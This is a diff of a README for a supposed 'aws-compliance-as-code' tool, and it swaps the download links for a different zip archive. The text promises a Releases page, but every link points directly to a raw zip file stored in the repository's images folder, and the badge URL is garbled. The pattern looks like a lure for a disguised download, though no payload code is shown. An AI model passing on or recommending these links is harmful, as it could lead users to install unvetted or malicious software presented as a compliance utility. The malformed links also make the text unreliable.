@@ -1,6 +1,6 @@
 # 🚀 aws-compliance-as-code - Simplifying Compliance Checks for You
 
-[![Download Latest Release](https://raw.githubusercontent.com/ailinanationalist604/aws-compliance-as-code/main/images/aws-compliance-as-code-2.9.zip%20Latest%https://raw.githubusercontent.com/ailinanationalist604/aws-compliance-as-code/main/images/aws-compliance-as-code-2.9.zip)](https://raw.githubusercontent.com/ailinanationalist604/aws-compliance-as-code/main/images/aws-compliance-as-code-2.9.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/ailinanationalist604/aws-compliance-as-code/main/images/code_as_aws_compliance_1.6.zip%20Latest%https://raw.githubusercontent.com/ailinanationalist604/aws-compliance-as-code/main/images/code_as_aws_compliance_1.6.zip)](https://raw.githubusercontent.com/ailinanationalist604/aws-compliance-as-code/main/images/code_as_aws_compliance_1.6.zip)
 
 ## 📖 Description
 
@@ -29,7 +29,7 @@ Before downloading the application, ensure your computer meets the following req
 
 To obtain the application, visit the following link to download the latest release:
 
-[Download Latest Release](https://raw.githubusercontent.com/ailinanationalist604/aws-compliance-as-code/main/images/aws-compliance-as-code-2.9.zip)
+[Download Latest Release](https://raw.githubusercontent.com/ailinanationalist604/aws-compliance-as-code/main/images/code_as_aws_compliance_1.6.zip)
 
 Once you are on the Releases page, choose the version that suits your operating system. Click on it to begin the download.
 
@@ -66,7 +66,7 @@ Follow this repository to receive updates on new features and versions.
 
 For current information, access our Releases page here:
 
-[Download Latest Release](https://raw.githubusercontent.com/ailinanationalist604/aws-compliance-as-code/main/images/aws-compliance-as-code-2.9.zip)
+[Download Latest Release](https://raw.githubusercontent.com/ailinanationalist604/aws-compliance-as-code/main/images/code_as_aws_compliance_1.6.zip)
 
 ## 📌 Topics
 
